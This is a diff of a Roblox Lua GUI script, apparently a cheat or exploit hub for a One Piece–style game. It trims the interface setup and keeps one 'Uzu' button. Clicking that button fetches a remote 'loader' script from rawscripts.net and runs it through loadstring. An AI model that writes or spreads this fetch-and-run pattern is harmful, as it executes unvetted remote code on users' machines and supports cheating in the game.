@@ -1,43 +1,10 @@
--- Gui to Lua
--- Version: 3.2
-
--- Instances:
-
-local A0nePiece = Instance.new("ScreenGui")
-local Credit = Instance.new("ScrollingFrame")
-local main = Instance.new("Folder")
-local UIGridLayout = Instance.new("UIGridLayout")
 local _0101Uzu = Instance.new("TextButton")
-local UICorner = Instance.new("UICorner")
+local _46ee8 = Instance.new("UICorner")
 
 --Properties:
 
-A0nePiece.Name = "A0nePiece"
-A0nePiece.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-A0nePiece.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-Credit.Name = "Credit"
-Credit.Parent = A0nePiece
-Credit.Active = true
-Credit.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
-Credit.BorderColor3 = Color3.fromRGB(28, 28, 28)
-Credit.Position = UDim2.new(0.0890000165, 0, 0.164387718, 0)
-Credit.Size = UDim2.new(0, 300, 0, 149)
-Credit.Visible = false
-Credit.CanvasSize = UDim2.new(0, 0, 5, 0)
-Credit.ScrollBarThickness = 0
-Credit.ScrollingEnabled = false
-
-main.Name = "main"
-main.Parent = Credit
-
-UIGridLayout.Parent = main
-UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-UIGridLayout.CellPadding = UDim2.new(0, 10, 0, 10)
-UIGridLayout.CellSize = UDim2.new(0, 230, 0, 30)
-
 _0101Uzu.Name = "0101Uzu"
-_0101Uzu.Parent = main
+_0101Uzu.Parent = game.StarterGui["A0nePiece"].Credit.main
 _0101Uzu.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 _0101Uzu.Position = UDim2.new(0.570001602, 0, 0.0573234782, 0)
 _0101Uzu.Size = UDim2.new(0, 100, 0, 30)
@@ -46,22 +13,16 @@ _0101Uzu.Text = "Uzu"
 _0101Uzu.TextColor3 = Color3.fromRGB(255, 255, 255)
 _0101Uzu.TextSize = 18.000
 
-UICorner.Parent = _0101Uzu
+_46ee8.Name = "46ee8"
+_46ee8.Parent = _0101Uzu
 
 -- Scripts:
 
-local function NLYA_fake_script() -- A0nePiece.Script 
-	local script = Instance.new('Script', A0nePiece)
-
-	A0nePiece.ScreenGui.Parent = game.CoreGui
-	
-end
-coroutine.wrap(NLYA_fake_script)()
-local function AZLW_fake_script() -- _0101Uzu.Script 
+local function XRUSSRX_fake_script() -- _0101Uzu.Script 
 	local script = Instance.new('Script', _0101Uzu)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGet("https://rawscripts.net/raw/loader_1038"))()
 	end)
 end
-coroutine.wrap(AZLW_fake_script)()
+coroutine.wrap(XRUSSRX_fake_script)()
